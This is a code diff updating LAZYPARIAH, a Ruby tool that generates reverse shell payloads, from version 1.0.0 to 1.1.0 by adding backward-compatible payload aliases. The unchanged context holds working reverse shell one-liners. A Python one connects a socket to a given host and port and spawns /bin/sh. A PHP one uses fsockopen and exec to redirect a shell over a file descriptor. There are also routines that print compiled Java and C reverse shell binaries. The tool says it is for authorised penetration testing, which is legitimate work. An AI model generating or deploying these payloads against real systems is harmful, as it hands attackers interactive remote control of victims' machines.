@@ -1,7 +1,7 @@
 #!/usr/bin/env ruby
 #
 # Title: LAZYPARIAH
-# Version: 1.0.0
+# Version: 1.1.0
 # Description:
 #	LAZYPARIAH is a simple tool for generating various reverse shell payloads
 #	on the fly. It is intended to be used only in authorised circumstances by
@@ -29,7 +29,7 @@ require "stringio"
 
 # Define constants.
 PROGRAM_NAME = "LAZYPARIAH".freeze()
-PROGRAM_VERSION = "1.0.0".freeze()
+PROGRAM_VERSION = "1.1.0".freeze()
 EXECUTABLE_NAME = "lazypariah".freeze()
 
 # Define payload list.
@@ -66,6 +66,28 @@ PAYLOAD_LIST = [
 	"c_binary_gzip_b64",
 	"c_binary_gzip_hex"
 ].sort()
+
+# Define dictionary of payload aliases for backwards compatibility with versions < 1.0.0.
+PAYLOAD_BC_DICT = {
+	"php_fd_3"=>{"payload"=>"php_fd", "fd"=>"3"},
+	"php_fd_4"=>{"payload"=>"php_fd", "fd"=>"4"},
+	"php_fd_5"=>{"payload"=>"php_fd", "fd"=>"5"},
+	"php_fd_6"=>{"payload"=>"php_fd", "fd"=>"6"},
+	"php_fd_3_c"=>{"payload"=>"php_fd_c", "fd"=>"3"},
+	"php_fd_4_c"=>{"payload"=>"php_fd_c", "fd"=>"4"},
+	"php_fd_5_c"=>{"payload"=>"php_fd_c", "fd"=>"5"},
+	"php_fd_6_c"=>{"payload"=>"php_fd_c", "fd"=>"6"},
+	"php_fd_3_tags"=>{"payload"=>"php_fd_tags", "fd"=>"3"},
+	"php_fd_4_tags"=>{"payload"=>"php_fd_tags", "fd"=>"4"},
+	"php_fd_5_tags"=>{"payload"=>"php_fd_tags", "fd"=>"5"},
+	"php_fd_6_tags"=>{"payload"=>"php_fd_tags", "fd"=>"6"},
+	"python3_c"=>{"payload"=>"python_c", "pv"=>"3"},
+	"python2_c"=>{"payload"=>"python_c", "pv"=>"2"},
+	"python3_b64"=>{"payload"=>"python_b64", "pv"=>"3"},
+	"python2_b64"=>{"payload"=>"python_b64", "pv"=>"2"},
+	"python3_hex"=>{"payload"=>"python_hex", "pv"=>"3"},
+	"python2_hex"=>{"payload"=>"python_hex", "pv"=>"2"}
+}
 
 # Define function for displaying program information.
 def prog_info(donation_info=true)
@@ -146,7 +168,7 @@ begin
 			puts("\nToo many command line arguments were given to #{PROGRAM_NAME}.\n")
 			puts(option_parser)
 			exit()
-		elsif not PAYLOAD_LIST.include?(ARGV[0])
+		elsif not PAYLOAD_LIST.include?(ARGV[0]) and not PAYLOAD_BC_DICT.include?(ARGV[0])
 			prog_info()
 			puts("\n#{PROGRAM_NAME} did not recognise the specified payload. Please consult the valid list of payloads below.\n")
 			puts(option_parser)
@@ -171,7 +193,17 @@ begin
 				exit()
 			end
 
-			case ARGV[0]
+			# Parse payload, applying aliases for backwards compatibility with versions < 1.0.0.
+			if PAYLOAD_BC_DICT.include?(ARGV[0])
+				bc_dict = PAYLOAD_BC_DICT[ARGV[0]]
+				selected_payload = bc_dict["payload"]
+				tcp_fd = bc_dict["fd"]
+				python_version = bc_dict["pv"]
+			else
+				selected_payload = ARGV[0]
+			end
+
+			case selected_payload
 			when "python"
 				print_output("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ARGV[1]}\",#{ARGV[2]}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);", url_encode=url_encode, new_line=!arguments[:"no-new-line"])
 			when "python_c"
@@ -196,7 +228,7 @@ begin
 				if not tcp_fd
 					puts("The payload you have selected requires a file descriptor to be specified. Please specify the file descriptor used by the target for TCP via the command-line argument \"-D NUMBER\" or \"--fd NUMBER\".")
 				else
-					case ARGV[0]
+					case selected_payload
 					when "php_fd"
 						print_output("$sock=fsockopen(\"#{ARGV[1]}\",#{ARGV[2]});exec(\"/bin/sh -i <&#{tcp_fd} >&#{tcp_fd} 2>&#{tcp_fd}\");", url_encode=url_encode, new_line=!arguments[:"no-new-line"])
 					when "php_fd_c"
@@ -241,7 +273,7 @@ begin
 
 				File.open(temp_dir+"/rs.class", "r") do |f|
 					java_payload = f.read()
-					case ARGV[0]
+					case selected_payload
 					when "java_class_binary"
 						print_output(java_payload, new_line=false)
 					when "java_class_b64"
@@ -270,7 +302,7 @@ begin
 
 				File.open(temp_dir+"/rs", "r") do |f|
 					binary_payload = f.read()
-					case ARGV[0]
+					case selected_payload
 					when "c_binary"
 						print_output(binary_payload, new_line=false)
 					when "c_binary_b64"
